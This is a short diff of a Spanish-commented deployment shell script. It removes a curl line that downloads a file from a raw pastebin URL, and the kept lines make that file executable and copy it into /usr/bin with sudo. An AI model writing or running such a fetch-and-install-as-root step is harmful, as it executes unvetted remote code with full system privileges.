@@ -346,7 +346,6 @@ check_step
 # Verificando servicios de trabajo para el despliegue
 
 iniciar_carga() {
-curl -o iniciar https://pastebin.com/raw/8aLb2Ui6
 dos2unix iniciar
 chmod +x iniciar
 sudo cp iniciar /usr/bin/iniciar
